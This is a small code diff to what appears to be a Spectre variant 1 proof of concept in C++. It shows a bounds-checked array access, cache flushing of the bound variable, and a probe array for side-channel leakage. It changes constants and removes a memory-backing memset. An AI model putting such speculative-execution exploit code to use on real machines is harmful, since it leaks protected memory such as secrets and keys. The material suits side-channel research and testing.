@@ -20,7 +20,7 @@ volatile uint8_t get_elem(size_t x)
     volatile uint8_t res = 0;
     if (x < array1_size)
     {
-        res &= array2[array1[x]*BLOCK_LEN];
+        res &= array2[array1[x]*256];
     }
     return res;
 }
@@ -31,13 +31,10 @@ int main()
                 array2,
                 [](volatile size_t x){flush(&array1_size); get_elem(x);},
                 [](size_t _t){return _t%array1_size;},
-                BLOCK_LEN,
+                256,
                 MAX_TRIES,
-                27
+                45
     );
-
-    // Make sure memory is backed
-    memset(array2, 1, sizeof(array2));
 
 //    uint8_t recovered[20];
 //    s.read(secret, 18, recovered);
